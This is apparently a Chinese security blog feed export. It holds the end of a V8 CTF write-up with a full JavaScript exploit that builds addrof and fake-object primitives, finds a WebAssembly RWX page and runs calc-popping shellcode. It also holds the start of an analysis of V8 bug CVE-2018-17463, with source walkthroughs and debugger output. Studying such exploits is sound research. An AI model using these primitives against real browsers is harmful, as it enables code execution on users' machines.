integers.//// Copyright (c) 2016 Samuel Groß//// Requires utils.js//// Datatype to represent 64-bit integers.//// Internally, the integer is stored as a Uint8Array in little endian byte order.function Int64(v) &#123; // The underlying byte array. var bytes = new Uint8Array(8); switch (typeof v) &#123; case 'number': v = '0x' + Math.floor(v).toString(16); case 'string': if (v.startsWith('0x')) v = v.substr(2); if (v.length % 2 == 1) v = '0' + v; var bigEndian = unhexlify(v, 8); bytes.set(Array.from(bigEndian).reverse()); break; case 'object': if (v instanceof Int64) &#123; bytes.set(v.bytes()); &#125; else &#123; if (v.length != 8) throw TypeError("Array must have excactly 8 elements."); bytes.set(v); &#125; break; case 'undefined': break; default: throw TypeError("Int64 constructor requires an argument."); &#125; // Return a double whith the same underlying bit representation. this.asDouble = function() &#123; // Check for NaN if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe)) throw new RangeError("Integer can not be represented by a double"); return Struct.unpack(Struct.float64, bytes); &#125;; // Return a javascript value with the same underlying bit representation. // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000) // due to double conversion constraints. this.asJSValue = function() &#123; if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff)) throw new RangeError("Integer can not be represented by a JSValue"); // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern. this.assignSub(this, 0x1000000000000); var res = Struct.unpack(Struct.float64, bytes); this.assignAdd(this, 0x1000000000000); return res; &#125;; // Return the underlying bytes of this number as array. this.bytes = function() &#123; return Array.from(bytes); &#125;; // Return the byte at the given index. this.byteAt = function(i) &#123; return bytes[i]; &#125;; // Return the value of this number as unsigned hex string. this.toString = function() &#123; return '0x' + hexlify(Array.from(bytes).reverse()); &#125;; // Basic arithmetic. // These functions assign the result of the computation to their 'this' object. // Decorator for Int64 instance operations. Takes care // of converting arguments to Int64 instances if required. function operation(f, nargs) &#123; return function() &#123; if (arguments.length != nargs) throw Error("Not enough arguments for function " + f.name); for (var i = 0; i &lt; arguments.length; i++) if (!(arguments[i] instanceof Int64)) arguments[i] = new Int64(arguments[i]); return f.apply(this, arguments); &#125;; &#125; // this = -n (two's complement) this.assignNeg = operation(function neg(n) &#123; for (var i = 0; i &lt; 8; i++) bytes[i] = ~n.byteAt(i); return this.assignAdd(this, Int64.One); &#125;, 1); // this = a + b this.assignAdd = operation(function add(a, b) &#123; var carry = 0; for (var i = 0; i &lt; 8; i++) &#123; var cur = a.byteAt(i) + b.byteAt(i) + carry; carry = cur &gt; 0xff | 0; bytes[i] = cur; &#125; return this; &#125;, 2); // this = a - b this.assignSub = operation(function sub(a, b) &#123; var carry = 0; for (var i = 0; i &lt; 8; i++) &#123; var cur = a.byteAt(i) - b.byteAt(i) - carry; carry = cur &lt; 0 | 0; bytes[i] = cur; &#125; return this; &#125;, 2);&#125;// Constructs a new Int64 instance with the same bit representation as the provided double.Int64.fromDouble = function(d) &#123; var bytes = Struct.pack(Struct.float64, d); return new Int64(bytes);&#125;;// Convenience functions. These allocate a new Int64 to hold the result.// Return -n (two's complement)function Neg(n) &#123; return (new Int64()).assignNeg(n);&#125;// Return a + bfunction Add(a, b) &#123; return (new Int64()).assignAdd(a, b);&#125;// Return a - bfunction Sub(a, b) &#123; return (new Int64()).assignSub(a, b);&#125;// Some commonly used numbers.Int64.Zero = new Int64(0);Int64.One = new Int64(1);function utf8ToString(h, p) &#123; let s = ""; for (i = p; h[i]; i++) &#123; s += String.fromCharCode(h[i]); &#125; return s;&#125;let global_var = Array();let double_map , element_map , double_map_obj , array_map , victim_jsarray,victim_arraybuffer;let global_tmp = [];var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);var wasmImports = &#123; env: &#123; puts: function puts (index) &#123; console.log(utf8ToString(h, index)); &#125; &#125;&#125;;let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);let h = new Uint8Array(m.exports.memory.buffer);let f = m.exports.p4nda;console.log("step 0: Game start");f();function exploit()&#123; function get_map_opt(x)&#123; let arr = [1.1,1.2,1.3,1.4]; let arr_ele = [arr,arr,arr,arr]; let index = 0; if(x = 'p4nda')&#123;index = 4;&#125; return [arr[index],arr,arr_ele]; &#125; function get_map()&#123; var tmp ; for(var i = 0; i&lt; 10000;i++)&#123; tmp = get_map_opt('test'); &#125; double_map = tmp[0]; element_map =Add(Int64.fromDouble(double_map), 0xa0).asDouble(); global_var.push(tmp[1]); global_var.push(tmp[2]); &#125; get_map(); console.log("double_map:",Int64.fromDouble(double_map)); console.log("element_map:",Int64.fromDouble(element_map)); function get_array_map_opt(x)&#123; let a = Array(2); a[0] = 1.1; a[1] = 1.2; let b = &#123;a0:1.1 , a1:1.1 , a2:1.1 , a3:1.1 , a4:1.1 , a5:1.1 , a6:1.1 , a7:1.1 , a8:1.1 , a9:1.1 , a10:1.1 , a11:1.1 , a12:1.1 , a13:1.1 , a14:1.1 , a15:1.1 , a16:1.1 , a17:1.1 , a18:1.1 , a19:1.1 , a20:1.1 , a21:1.1 , a22:1.1 , a23:1.1 , a24:1.1 , a25:1.1 , a26:1.1 , a27:1.1 , a28:1.1 , a29:1.1&#125;; let index = 0; if(x = 'p4nda')&#123;index = 2;&#125; return [a[index],b]; &#125; function get_array_map()&#123; for(var i = 0; i&lt; 10000; i++)&#123; var tmp = get_array_map_opt(); &#125; array_map = tmp[0]; global_tmp.push(tmp[1]); //%DebugPrint(tmp[1]); &#125; get_array_map(); console.log("array_map",Int64.fromDouble(array_map)); function prepare_double_map_opt(x)&#123; let arr = [double_map,double_map,double_map,double_map]; let index = 0; if(x = 'p4nda')&#123;index = 4;&#125; arr[index] = element_map; return arr; &#125; function prepare_double_map()&#123; var tmp; for (var i = 0; i&lt; 10000;i++)&#123; tmp = prepare_double_map_opt(); &#125; return tmp[1]; &#125; double_map_obj = prepare_double_map(); function addrof_opt(obj)&#123; var a = [obj, obj, obj, obj]; let index = 0; if(x = 'p4nda')&#123;index = 4&#125;; a[index] = double_map_obj; return a; &#125; function addrof(obj)&#123; for(var i = 0;i&lt;100000;i++)&#123; var a = addrof_opt(obj); &#125; return a[0]; &#125; f_obj_addr = Int64.fromDouble(addrof(f)) console.log("address of function obj:",f_obj_addr); //%DebugPrint(f); function get_victim_obj_opt(x)&#123; let b = [11.1,1.1]; let index = 0; if (x = 'p4nda')&#123;index = 2;&#125; b[index] = array_map; console.log(b.length); return b; &#125; function get_victim_obj()&#123; for (var i = 0 ; i &lt; 10000; i++)&#123; var tmp = get_victim_obj_opt(); &#125; victim_arraybuffer = new ArrayBuffer(0x100); victim_jsarray = tmp; &#125; get_victim_obj(); //%DebugPrint(victim_jsarray); //%DebugPrint(victim_arraybuffer); console.log(Int64.fromDouble(victim_jsarray.a5)); victim_jsarray.a5 = f_obj_addr.asDouble(); let dv = new DataView(victim_arraybuffer); SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true)); console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr); victim_jsarray.a5 = SharedFunctionInfo_addr.asDouble(); WasmExportedFunctionData_addr = Int64.fromDouble(dv.getFloat64(0x7,true)); console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr); //let tmp = addrof(f); victim_jsarray.a5 = WasmExportedFunctionData_addr.asDouble(); WasmInstanceObject_addr = Int64.fromDouble(dv.getFloat64(0xf,true)); console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr); victim_jsarray.a5 = WasmInstanceObject_addr.asDouble(); imported_function_targets_addr = Int64.fromDouble(dv.getFloat64(0x3f,true)); console.log("[+] imported_function_targets addr :"+imported_function_targets_addr); victim_jsarray.a5 = imported_function_targets_addr.asDouble(); rwx_area = Int64.fromDouble(dv.getFloat64(0,true)); console.log("[+] rwx_area addr :"+rwx_area); victim_jsarray.a5 = rwx_area.asDouble(); let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93]; let write_tmp = new Uint8Array(victim_arraybuffer); write_tmp.set(shellcode_calc); console.log("[+] Enter to pop up a calc ... "); readline(); f();&#125;exploit(); 由于chromium编译太慢了，用d8代替结果：]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google V8引擎的CVE-2018-17463漏洞分析]]></title>
    <url>%2F2019%2F06%2F11%2F%C2%96CVE-2018-17463%2F</url>
    <content type="text"><![CDATA[环境搭建该漏洞于commit 52a9e67a477bdb67ca893c25c145ef5191976220，因此可以切换至其上一版本568979f4d891bafec875fab20f608ff9392f4f29进行漏洞复现。 可以直接利用如下脚本编译release版本 12345678910#!/bin/bashset -Eeuxo pipefailfetch v8pushd v8git checkout 568979f4d891bafec875fab20f608ff9392f4f29gclient sync./tools/dev/gm.py x64.releasepopd 本文涉及的环境及代码可以从此处下载。 漏洞原因源码分析漏洞存在于src/compiler/js-operator.cc:625。在此处，代码定义了许多常见IR操作的标识，存在问题的是对JSCreateObject操作的判断。 1234#define CACHED_OP_LIST(V) \... ... V(CreateObject, Operator::kNoWrite, 1, 1) \... ... 关于IR,是TurboFan内部使用的一种基于图的中间表示，基于Sea-of-Nodes思想。TurboFan通过各节点的的控制依赖（Control dependence）、数据依赖（Data dependence）和操作依赖（Effect dependence）构建IR，并通过多次运行收集的类型信息进行推断优化（speculate）。 而此处定义的IR操作标识，标识在CreateObject操作过程中不存在可见的副作用（side-effects），即无需记录到影响链(effect chain)中去。 关于标志的枚举定义在src/compiler/operator.h:28 123456789101112 // Properties inform the operator-independent optimizer about legal // transformations for nodes that have this operator. enum Property &#123; kNoProperties = 0, kCommutative = 1 &lt;&lt; 0, // OP(a, b) == OP(b, a) for all inputs. kAssociative = 1 &lt;&lt; 1, // OP(a, OP(b,c)) == OP(OP(a,b), c) for all inputs. kIdempotent = 1 &lt;&lt; 2, // OP(a); OP(a) == OP(a). kNoRead = 1 &lt;&lt; 3, // Has no scheduling dependency on Effects kNoWrite = 1 &lt;&lt; 4, // Does not modify any Effects and thereby // create new scheduling dependencies.... ... &#125;; 而关于JSCreateObject这个操作不存在副作用的推断是否正确，还需要进一步分析。 在Turbofan的优化过程中，存在一个generic-lowering阶段，其作用是将JS前缀指令转换为更简单的调用和stub调用。在src/compiler/js-generic-lowering.cc:404，可以看到在generic-lowering中，Turbofan把JSCreateObject节点用Builtins函数kCreateObjectWithoutProperties代替，而kCreateObjectWithoutProperties就是一个stub调用。 123456void JSGenericLowering::LowerJSCreateObject(Node* node) &#123; CallDescriptor::Flags flags = FrameStateFlagForCall(node); Callable callable = Builtins::CallableFor( isolate(), Builtins::kCreateObjectWithoutProperties); ReplaceWithStubCall(node, callable, flags);&#125; kCreateObjectWithoutProperties函数定义在src/builtins/builtins-object-gen.cc:1101。 Ps：这个函数在调试时没有办法直接设置运行断点，需要在函数开头自行添加DebugBreak() 123456789101112131415TF_BUILTIN(CreateObjectWithoutProperties, ObjectBuiltinsAssembler) &#123; Node* const prototype = Parameter(Descriptor::kPrototypeArg); Node* const context = Parameter(Descriptor::kContext); Node* const native_context = LoadNativeContext(context); Label call_runtime(this, Label::kDeferred), prototype_null(this), prototype_jsreceiver(this);...... BIND(&amp;call_runtime); &#123; Comment("Call Runtime (prototype is not null/jsreceiver)");[*] Node* result = CallRuntime(Runtime::kObjectCreate, context, prototype, UndefinedConstant()); Return(result); &#125;&#125; 在kCreateObjectWithoutProperties的最后调用了runtime函数ObjectCreate，定义在src/runtime/runtime-object.cc:316,在对输入的Object中的prototype属性进行了简单判断后，调用了JSObject::ObjectCreate。 12345678910111213141516171819// ES6 section 19.1.2.2 Object.create ( O [ , Properties ] )// TODO(verwaest): Support the common cases with precached map directly in// an Object.create stub.RUNTIME_FUNCTION(Runtime_ObjectCreate) &#123; HandleScope scope(isolate); Handle&lt;Object&gt; prototype = args.at(0); Handle&lt;Object&gt; properties = args.at(1); Handle&lt;JSObject&gt; obj; // 1. If Type(O) is neither Object nor Null, throw a TypeError exception. if (!prototype-&gt;IsNull(isolate) &amp;&amp; !prototype-&gt;IsJSReceiver()) &#123; THROW_NEW_ERROR_RETURN_FAILURE( isolate, NewTypeError(MessageTemplate::kProtoObjectOrNull, prototype)); &#125; // 2. Let obj be ObjectCreate(O). ASSIGN_RETURN_FAILURE_ON_EXCEPTION( [*] isolate, obj, JSObject::ObjectCreate(isolate, prototype));... ...&#125; JSObject::ObjectCreate函数定义在src/objects.cc:1360，可以看到整个函数的流程是利用原有Object中的Map生成新的Map，再根据Map的类型，去生成新的Object。其中Map分为两个模式，dictionary mode和fast mode，dictionary mode类似于hash表存储，结构较复杂。fast mode是简单的结构体模式。 12345678910111213141516171819// Notice: This is NOT 19.1.2.2 Object.create ( O, Properties )MaybeHandle&lt;JSObject&gt; JSObject::ObjectCreate(Isolate* isolate, Handle&lt;Object&gt; prototype) &#123; // Generate the map with the specified &#123;prototype&#125; based on the Object // function's initial map from the current native context. // TODO(bmeurer): Use a dedicated cache for Object.create; think about // slack tracking for Object.create. Handle&lt;Map&gt; map = [*] Map::GetObjectCreateMap(isolate, Handle&lt;HeapObject&gt;::cast(prototype)); // Actually allocate the object. Handle&lt;JSObject&gt; object; if (map-&gt;is_dictionary_map()) &#123; object = isolate-&gt;factory()-&gt;NewSlowJSObjectFromMap(map); &#125; else &#123; object = isolate-&gt;factory()-&gt;NewJSObjectFromMap(map); &#125; return object;&#125; 在Map::GetObjectCreateMap函数中涉及了对输入的Object的操作，定义于src/objects.cc:5450。 首先对map和prototype的类型进行判断，当满足(prototype-&gt;IsJSObject()且!js_prototype-&gt;map()-&gt;is_prototype_map()调用JSObject::OptimizeAsPrototype(js_prototype);输入的Object进行优化。 12345678910111213141516171819202122232425262728Handle&lt;Map&gt; Map::GetObjectCreateMap(Isolate* isolate, Handle&lt;HeapObject&gt; prototype) &#123; Handle&lt;Map&gt; map(isolate-&gt;native_context()-&gt;object_function()-&gt;initial_map(), isolate); if (map-&gt;prototype() == *prototype) return map; if (prototype-&gt;IsNull(isolate)) &#123; return isolate-&gt;slow_object_with_null_prototype_map(); &#125; if (prototype-&gt;IsJSObject()) &#123; Handle&lt;JSObject&gt; js_prototype = Handle&lt;JSObject&gt;::cast(prototype); if (!js_prototype-&gt;map()-&gt;is_prototype_map()) &#123; [*] JSObject::OptimizeAsPrototype(js_prototype); &#125; Handle&lt;PrototypeInfo&gt; info = Map::GetOrCreatePrototypeInfo(js_prototype, isolate); // TODO(verwaest): Use inobject slack tracking for this map. if (info-&gt;HasObjectCreateMap()) &#123; map = handle(info-&gt;ObjectCreateMap(), isolate); &#125; else &#123; map = Map::CopyInitialMap(isolate, map); Map::SetPrototype(isolate, map, prototype); PrototypeInfo::SetObjectCreateMap(info, map); &#125; return map; &#125; return Map::TransitionToPrototype(isolate, map, prototype);&#125; 在JSObject::OptimizeAsPrototype函数中 ，定义于src/objects.cc:12518，当满足PrototypeBenefitsFromNormalization(object))时，调用JSObject::NormalizeProperties对原有Object进行优化。 然后再根据原Object的map，申请并复制生成新map。 1234567891011121314151617181920// staticvoid JSObject::OptimizeAsPrototype(Handle&lt;JSObject&gt; object, bool enable_setup_mode) &#123; if (object-&gt;IsJSGlobalObject()) return; if (enable_setup_mode &amp;&amp; PrototypeBenefitsFromNormalization(object)) &#123; // First normalize to ensure all JSFunctions are DATA_CONSTANT.[*] JSObject::NormalizeProperties(object, KEEP_INOBJECT_PROPERTIES, 0, "NormalizeAsPrototype"); &#125; if (object-&gt;map()-&gt;is_prototype_map()) &#123; if (object-&gt;map()-&gt;should_be_fast_prototype_map() &amp;&amp; !object-&gt;HasFastProperties()) &#123; JSObject::MigrateSlowToFast(object, 0, "OptimizeAsPrototype"); &#125; &#125; else &#123;... ... &#125; &#125; &#125;&#125; 在JSObject::NormalizeProperties函数中，src/objects.cc:6436，可以发现该函数会调用Map::Normalize根据原有的map生成一个新的map，并且利用新的map重新构建输入的Object，这明显是一个具有side-effect的操作。 1234567891011void JSObject::NormalizeProperties(Handle&lt;JSObject&gt; object, PropertyNormalizationMode mode, int expected_additional_properties, const char* reason) &#123; if (!object-&gt;HasFastProperties()) return; Handle&lt;Map&gt; map(object-&gt;map(), object-&gt;GetIsolate());[*] Handle&lt;Map&gt; new_map = Map::Normalize(object-&gt;GetIsolate(), map, mode, reason); MigrateToMap(object, new_map, expected_additional_properties);&#125; 继续跟进Map::Normalize，src/objects.cc:9185，新的map是由Map::CopyNormalized生成的。 123456789101112131415161718192021222324252627Handle&lt;Map&gt; Map::Normalize(Isolate* isolate, Handle&lt;Map&gt; fast_map, PropertyNormalizationMode mode, const char* reason) &#123; DCHECK(!fast_map-&gt;is_dictionary_map()); Handle&lt;Object&gt; maybe_cache(isolate-&gt;native_context()-&gt;normalized_map_cache(), isolate); bool use_cache = !fast_map-&gt;is_prototype_map() &amp;&amp; !maybe_cache-&gt;IsUndefined(isolate); Handle&lt;NormalizedMapCache&gt; cache; if (use_cache) cache = Handle&lt;NormalizedMapCache&gt;::cast(maybe_cache); Handle&lt;Map&gt; new_map; if (use_cache &amp;&amp; cache-&gt;Get(fast_map, mode).ToHandle(&amp;new_map)) &#123;... ... &#125; else &#123;[*] new_map = Map::CopyNormalized(isolate, fast_map, mode); if (use_cache) &#123; cache-&gt;Set(fast_map, new_map); isolate-&gt;counters()-&gt;maps_normalized()-&gt;Increment(); &#125; if (FLAG_trace_maps) &#123; LOG(isolate, MapEvent("Normalize", *fast_map, *new_map, reason)); &#125; &#125; fast_map-&gt;NotifyLeafMapLayoutChange(isolate); return new_map;&#125; 在Map::CopyNormalized函数中, src/objects.cc:9247，利用RawCopy生成了新的map，随后进行了赋值，包括set_is_dictionary_map，比较明显的是，新生成的map是dictionary模式的。 123456789101112131415161718192021222324Handle&lt;Map&gt; Map::CopyNormalized(Isolate* isolate, Handle&lt;Map&gt; map, PropertyNormalizationMode mode) &#123; int new_instance_size = map-&gt;instance_size(); if (mode == CLEAR_INOBJECT_PROPERTIES) &#123; new_instance_size -= map-&gt;GetInObjectProperties() * kPointerSize; &#125;[*] Handle&lt;Map&gt; result = RawCopy( isolate, map, new_instance_size, mode == CLEAR_INOBJECT_PROPERTIES ? 0 : map-&gt;GetInObjectProperties()); // Clear the unused_property_fields explicitly as this field should not // be accessed for normalized maps. result-&gt;SetInObjectUnusedPropertyFields(0); result-&gt;set_is_dictionary_map(true); result-&gt;set_is_migration_target(false); result-&gt;set_may_have_interesting_symbols(true); result-&gt;set_construction_counter(kNoSlackTracking);#ifdef VERIFY_HEAP if (FLAG_verify_heap) result-&gt;DictionaryMapVerify(isolate);#endif return result;&#125; 在Map::RawCopy中，src/objects.cc:9163，首先新建了一个Handle&lt;Map&gt;，并调用Map::SetPrototype为其设置prototype属性。 12345678910Handle&lt;Map&gt; Map::RawCopy(Isolate* isolate, Handle&lt;Map&gt; map, int instance_size, int inobject_properties) &#123; Handle&lt;Map&gt; result = isolate-&gt;factory()-&gt;NewMap( map-&gt;instance_type(), instance_size, TERMINAL_FAST_ELEMENTS_KIND, inobject_properties); Handle&lt;Object&gt; prototype(map-&gt;prototype(), isolate);[*] Map::SetPrototype(isolate, result, prototype);... ... return result;&#125; 在Map::SetPrototype中，src/objects.cc:12792，调用JSObject::OptimizeAsPrototype为原有Object的prototype进行优化。 12345678910111213// staticvoid Map::SetPrototype(Isolate* isolate, Handle&lt;Map&gt; map, Handle&lt;Object&gt; prototype, bool enable_prototype_setup_mode) &#123; RuntimeCallTimerScope stats_scope(isolate, *map, RuntimeCallCounterId::kMap_SetPrototype); bool is_hidden = false; if (prototype-&gt;IsJSObject()) &#123; Handle&lt;JSObject&gt; prototype_jsobj = Handle&lt;JSObject&gt;::cast(prototype);[*] JSObject::OptimizeAsPrototype(prototype_jsobj, enable_prototype_setup_mode);... ...&#125; 经过JSObject::OptimizeAsPrototype(src/objects.cc:12519) 未满足条件，故不进行优化。 最终，原有Object调用JSObject::MigrateToMap，src/objects.cc:4514，根据生成的dictionary mode map进行了重构。 123456789101112131415161718192021222324void JSObject::MigrateToMap(Handle&lt;JSObject&gt; object, Handle&lt;Map&gt; new_map, int expected_additional_properties) &#123; if (object-&gt;map() == *new_map) return; Handle&lt;Map&gt; old_map(object-&gt;map(), object-&gt;GetIsolate()); NotifyMapChange(old_map, new_map, object-&gt;GetIsolate()); if (old_map-&gt;is_dictionary_map()) &#123; // For slow-to-fast migrations JSObject::MigrateSlowToFast() // must be used instead.... ... &#125; else if (!new_map-&gt;is_dictionary_map()) &#123;... ... &#125; &#125; else &#123; MigrateFastToSlow(object, new_map, expected_additional_properties); &#125; // Careful: Don't allocate here! // For some callers of this method, |object| might be in an inconsistent // state now: the new map might have a new elements_kind, but the object's // elements pointer hasn't been updated yet. Callers will fix this, but in // the meantime, (indirectly) calling JSObjectVerify() must be avoided. // When adding code here, add a DisallowHeapAllocation too.&#125; 从而我们找到了经过JSCreate操作的数据，是可以被改变的，因此将JSCreate认定为KNoWrite的确是不正确的。 思路验证关于JSCreate操作可以利用Object.create函数触发。 语法 Object.create(proto, [propertiesObject])参数 新创建对象的原型对象。 propertiesObject 可选。如果没有指定为 undefined，则是要添加到新创建对象的可枚举属性（即其自身定义的属性，而不是其原型链上的枚举属性）对象的属性描述符以及相应的属性名称。这些属性对应Object.defineProperties()的第二个参数。 返回值一个新对象，带着指定的原型对象和属性。 例外如果propertiesObject参数是 null 或非原始包装对象，则抛出一个 TypeError 异常。 通过如下代码可以发现，在执行如下代码后，Object a的map的确从fast mode变成了Dictionary 1234let a = &#123;x : 1&#125;;%DebugPrint(a);Object.create(a);%DebugPrint(a); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out.gn/x64.debug] - [三 6月 12, 19:23]└─[$] &lt;git:(568979f*)&gt; ./d8 --allow-natives-syntax ./test.js DebugPrint: 0x16610e38e1b1: [JS_OBJECT_TYPE] - map: 0x0edbef28c981 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x39b5de6046d9 &lt;Object map = 0xedbef2822f1&gt; - elements: 0x3b84cb382cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x3b84cb382cf1 &lt;FixedArray[0]&gt; &#123; #x: 1 (data field 0) &#125;0xedbef28c981: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x0edbef28c931 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x372622982201 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x16610e38e1d1 &lt;DescriptorArray[5]&gt; - layout descriptor: (nil) - prototype: 0x39b5de6046d9 &lt;Object map = 0xedbef2822f1&gt; - constructor: 0x39b5de604711 &lt;JSFunction Object (sfi = 0x37262298f991)&gt; - dependent code: 0x3b84cb382391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0DebugPrint: 0x16610e38e1b1: [JS_OBJECT_TYPE] - map: 0x0edbef28ca21 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x39b5de6046d9 &lt;Object map = 0xedbef2822f1&gt; - elements: 0x3b84cb382cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x16610e38e209 &lt;NameDictionary[17]&gt; &#123; #x: 1 (data, dict_index: 1, attrs: [WEC]) &#125;0xedbef28ca21: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - dictionary_map - may_have_interesting_symbols - prototype_map - prototype info: 0x39b5de623039 &lt;PrototypeInfo&gt; - prototype_validity cell: 0x372622982201 &lt;Cell value= 1&gt; - instance descriptors (own) #0: 0x3b84cb382321 &lt;DescriptorArray[2]&gt; - layout descriptor: (nil) - prototype: 0x39b5de6046d9 &lt;Object map = 0xedbef2822f1&gt; - constructor: 0x39b5de604711 &lt;JSFunction Object (sfi = 0x37262298f991)&gt; - dependent code: 0x3b84cb382391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 漏洞利用漏洞触发当前的漏洞已经可以影响一个Object的结构，将其模式修改为Directory，但究竟可以影响Object哪些位置，还需要进一步探究，首先可以先从Object自身结构入手，研究一下在Object.create对传入对象的影响。 我们知道，在JavaScript中对于一个对象属性的定义有两种，一种是在属性初始化时加入，另一种是在操作中加入，测试代码如下： 123456789let a = &#123;x : 1,y:2,z:3&#125;;a.b = 4;a.c = 5;a.d = 6;%DebugPrint(a);readline();Object.create(a);%DebugPrint(a);readline(); 在第一处readline时，可以发现a这个Object的构造如下： 1234567891011121314pwndbg&gt; v8print 0x31132b18e1e90x31132b18e1e9: [JS_OBJECT_TYPE] - map: 0x0bf82a48cb11 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x2e853b0046d9 &lt;Object map = 0xbf82a4822f1&gt; - elements: 0x006338502cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x31132b18e389 &lt;PropertyArray[3]&gt; &#123; #x: 1 (data field 0) #y: 2 (data field 1) #z: 3 (data field 2) #b: 4 (data field 3) properties[0] #c: 5 (data field 4) properties[1] #d: 6 (data field 5) properties[2] &#125;$1 = 0 可以发现，a拥有6个属性，其中b、c、d标志为properties[x]，继续查看这个Object的map，发现在map中指明了整个Object的大小是48字节，并存在3个inobject properties也就是保存在结构体内部的属性，且是[FastProperties]模式的。 1234567891011121314151617pwndbg&gt; v8print 0x0bf82a48cb110xbf82a48cb11: [Map] - type: JS_OBJECT_TYPE - instance size: 48 - inobject properties: 3 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x0bf82a48cac1 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x2e853b006459 &lt;Cell value= 0&gt; - instance descriptors (own) #6: 0x31132b18e449 &lt;DescriptorArray[20]&gt; - layout descriptor: (nil) - prototype: 0x2e853b0046d9 &lt;Object map = 0xbf82a4822f1&gt; - constructor: 0x2e853b004711 &lt;JSFunction Object (sfi = 0x1a09a450aba9)&gt; - dependent code: 0x006338502391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 根据JS中对象指针的形式，可以查看这个Object的结构，显然我们在a初始化中声明的属性值x,y,z被保存在结构体内部，且符合map中指出的三个结构体。 1234pwndbg&gt; x /6gx 0x31132b18e1e80x31132b18e1e8: 0x00000bf82a48cb11 0x000031132b18e3890x31132b18e1f8: 0x0000006338502cf1 0x00000001000000000x31132b18e208: 0x0000000200000000 0x0000000300000000 再看a结构体中的第二个8字节，在v8print中可以看出其指向properties成员。 123456789pwndbg&gt; v8print 0x31132b18e3890x31132b18e389: [PropertyArray] - map: 0x006338503899 &lt;Map&gt; - length: 3 - hash: 0 0: 4 1: 5 2: 6$3 = 0 发现在后续操作中添加的a,b,c被保存在这里，并且属性值的存储顺序是固定的。 1230x31132b18e388: 0x0000006338503899 0x00000003000000000x31132b18e398: 0x0000000400000000 0x00000005000000000x31132b18e3a8: 0x0000000600000000 而在执行Object.create后，可以发现a的map成员发生了改变，符合我们之前对源码的分析，Object.create对输入的map进行了优化，改为了DictionaryProperties模式： 1234567891011121314pwndbg&gt; v8print 0x31132b18e1e90x31132b18e1e9: [JS_OBJECT_TYPE] - map: 0x0bf82a48cbb1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: 0x2e853b0046d9 &lt;Object map = 0xbf82a4822f1&gt; - elements: 0x006338502cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x31132b18e4f9 &lt;NameDictionary[53]&gt; &#123; #z: 3 (data, dict_index: 3, attrs: [WEC]) #d: 6 (data, dict_index: 6, attrs: [WEC]) #b: 4 (data, dict_index: 4, attrs: [WEC]) #c: 5 (data, dict_index: 5, attrs: [WEC]) #y: 2 (data, dict_index: 2, attrs: [WEC]) #x: 1 (data, dict_index: 1, attrs: [WEC]) &#125;$4 = 0 而再次查看结构体，发现其中保存的x,y,z属性值并未存在结构体中： 1234pwndbg&gt; x /6gx 0x31132b18e1e80x31132b18e1e8: 0x00000bf82a48cbb1 0x000031132b18e4f90x31132b18e1f8: 0x0000006338502cf1 0x00000000000000000x31132b18e208: 0x0000000000000000 0x0000000000000000 